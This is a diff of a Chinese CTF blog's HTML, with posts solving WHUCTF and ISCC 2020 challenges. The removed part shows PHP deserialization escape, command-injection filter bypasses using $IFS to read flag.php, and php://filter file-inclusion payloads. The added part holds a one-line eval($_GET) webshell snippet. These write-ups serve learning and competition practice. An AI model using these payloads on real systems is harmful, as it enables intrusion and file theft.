-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str1=11230178&amp;str2=20493141</span><br></pre></td></tr></table></figure>
-<p>第三关：php反序列化字符逃逸</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> filter(<span class="variable">$string</span>)&#123;</span><br><span class="line">    <span class="built_in">return</span> preg_replace(<span class="string">'/x/'</span>, <span class="string">'yy'</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">'123456xxxxxxxxxxxxxxxxxxxx";i:1;s:6:"123456";&#125;'</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">"aaaaa"</span>;</span><br><span class="line"><span class="variable">$user</span> = array(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$r</span> = filter(serialize(<span class="variable">$user</span>));</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$r</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$user</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$r</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/whuctf_serialize.jpg" alt=""><br>下面是最终payload</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?num=2333%0a&amp;str1=11230178&amp;str2=20493141</span><br><span class="line">以post方式传入username=123456xxxxxxxxxxxxxxxxxxxx<span class="string">";i:1;s:6:"</span>123456<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure>
-<p>在源码中就可发现flag</p>
-<h4 id="ezcmd"><a href="#ezcmd" class="headerlink" title="ezcmd"></a>ezcmd</h4><p>打开链接啥也没有，源码中啥也没有，扫了下目录，发现有个index,下载下来里面就有flag,感觉是非预期，这应该是出题人疏忽了吧，也没用到题目中所说的命令执行，index文件内容如下<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/ezcmd0.jpg" alt=""><br>最后题目修复了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/ezcmd1.jpg" alt=""><br>扫一下目录</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;ls</span><br></pre></td></tr></table></figure>
-<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/ezcmd2.jpg" alt=""><br>题目过滤了许多关键词，需要绕过来读取flag.php<br>od命令：<a href="https://www.cnblogs.com/cxgg/p/9165062.html" target="_blank" rel="noopener">https://www.cnblogs.com/cxgg/p/9165062.html</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;a=lag.php;b=f;od<span class="variable">$IFS</span><span class="variable">$1</span>-tc<span class="variable">$IFS</span><span class="variable">$1</span><span class="variable">$b</span><span class="variable">$a</span></span><br></pre></td></tr></table></figure>
-<p>或者用ca$@t来替换cat命令也可以读取flag.php</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;a=lag.php;b=f;ca<span class="variable">$@t</span><span class="variable">$IFS</span><span class="variable">$1</span><span class="variable">$b</span><span class="variable">$a</span></span><br></pre></td></tr></table></figure>
-<p>然后在源码中会发现flag<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/ezcmd3.jpg" alt=""></p>
-<h4 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h4><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/include/include0.jpg" alt=""><br>随便写点提交<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/include/include1.jpg" alt=""><br>看见thankyou.php,盲猜flag.php,直接伪协议读取</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
-<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/include/include2.jpg" alt=""></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCg0KLy9mbGFnPXdodWN0ZntOMHdfeTB1X2tuMHdfZmlsZV9pbmNsdXNpb259DQoNCg==</span><br></pre></td></tr></table></figure>
-<p>base64解码</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag=whuctf&#123;N0w_y0u_kn0w_file_inclusion&#125;</span><br></pre></td></tr></table></figure>
-<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h3><h4 id="智能合约-那是啥"><a href="#智能合约-那是啥" class="headerlink" title="智能合约? 那是啥"></a>智能合约? 那是啥</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">0x202E653dA93c2a06076FC95B0A07E39B6003C5f6 Ropsten</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * The CoinFlip contract does nothing...</span><br><span class="line"> */</span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">	uint256 lashHash;</span><br><span class="line">	uint256 Factor = 20244007718664171871063861089;</span><br><span class="line">    mapping (address =&gt; uint) balances;</span><br><span class="line">    string flag;</span><br><span class="line"></span><br><span class="line">	constructor (string _flag) public &#123;</span><br><span class="line">		flag = _flag;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">function</span> getBalance () public returns(uint) &#123;</span><br><span class="line">		<span class="built_in">return</span> balances[tx.origin];</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">function</span> flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">		uint256 blockValue = uint256(block.blockhash(block.number - 1));</span><br><span class="line">		lashHash = blockValue;</span><br><span class="line">		uint256 ans = blockValue / Factor;</span><br><span class="line">		bool side = ans == 1 ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">			balances[tx.origin]++;</span><br><span class="line">			<span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			balances[tx.origin] = 0;</span><br><span class="line">			<span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> GetTheFlag() public view returns (string)&#123;</span><br><span class="line">		<span class="built_in">return</span> flag;  // You can get your flag here</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>编译一下，点击GetTheFlag就会输出flag<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/Smart_contract/WHUCTF_1/1.jpg" alt=""></p>
-<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="佛系青年BingGe"><a href="#佛系青年BingGe" class="headerlink" title="佛系青年BingGe"></a>佛系青年BingGe</h4><p>我看见我的朋友BingGe坐在信部网球场的栅栏边上看一本佛经，我很好奇，也过去看，只见上面写着: 佛曰：般羅穆僧冥神大侄所隸奢尼哆恐侄大藐若故曳咒室呐阿竟諳他缽悉爍諦哆咒豆苦缽尼帝所冥等上哆瑟俱薩諸諳伊冥特諳實怯他罰不參亦皤有婆僧藝俱羯怯至皤滅知真哆訶亦能怯瑟梵陀奢知呼故梵夢死有皤能薩曰俱穆勝竟怯明奢參世缽佛皤羯瑟奢孕梵逝楞呐醯故奢想謹提諦盡侄阿哆利俱吉罰老謹涅神能皤集實輸奢薩奢數哆波者俱勝俱所遠盡呐倒利闍盧諦罰薩梵曰度提大諦哆穆輸醯怯參侄諸娑梵伽知勝穆伊顛冥參道冥有<br>第一步与佛论禅解密</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">767566536773bf1ef643676363676784e1d015847635575637560ff4f41d</span><br></pre></td></tr></table></figure>
-<p>尝试转ASCII，转换失败，题目中说到栅栏，栅栏解密，当为6栏时</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7768756374667b6e305f315f616d5f6e30745f615f36756464683173747d</span><br></pre></td></tr></table></figure>
-<p>转ASCII成功whuctf{n0_1_am_n0t_a_6uddh1st}</p>
-<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Bivibivi"><a href="#Bivibivi" class="headerlink" title="Bivibivi"></a>Bivibivi</h4><p>Do you know B-site?<br>nc 218.197.154.9 16387<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/nc0.jpg" alt=""><br>第一步就直接模逆运算，然后就没啥了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/nc1.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/nc2.jpg" alt=""></p>
+          <p>由于eval()函数允许执行任意php代码，这就会造成远程代码执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="variable">$_GET</span>[<span class="string">'shell'</span>]);</span><br></pre></td></tr></table></figure>
+<p>即一句话木马，就可以getshell了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">'shell'</span>]=system(<span class="string">'ls /'</span>);</span><br><span class="line"><span class="built_in">eval</span>(<span class="variable">$_GET</span>[<span class="string">'shell'</span>]);等同于<span class="built_in">eval</span>(system(<span class="string">'ls /'</span>));</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/05/10/%E6%97%A0%E5%8F%82%E5%87%BD%E6%95%B0RCE/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/08/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="w1ndy">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="w1ndy">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/05/08/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/" itemprop="url">php伪随机数</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-08T13:25:49+08:00">
+                2020-05-08
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-05-11T18:58:41+08:00">
+                2020-05-11
+              </time>
+            
+          </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-Web/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF-Web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(100);</span><br><span class="line"><span class="built_in">echo</span> mt_rand().<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> mt_rand();</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">mt_srand(100);</span><br><span class="line"><span class="built_in">echo</span> mt_rand().<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> mt_rand();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/05/08/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/01/ISCC-2020/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="w1ndy">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="w1ndy">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/05/01/ISCC-2020/" itemprop="url">ISCC-2020</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-01T16:36:27+08:00">
+                2020-05-01
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-07-01T12:04:05+08:00">
+                2020-07-01
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-Web/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF-Web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="阿森的爱情-1"><a href="#阿森的爱情-1" class="headerlink" title="阿森的爱情-1"></a>阿森的爱情-1</h4><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ISCC-2020/web1.jpg" alt=""><br>测试了下SQL注入，没啥反应，源码也啥都没有<br>dirsearch直接扫，在readme.txt中发现flag</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/05/01/ISCC-2020/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
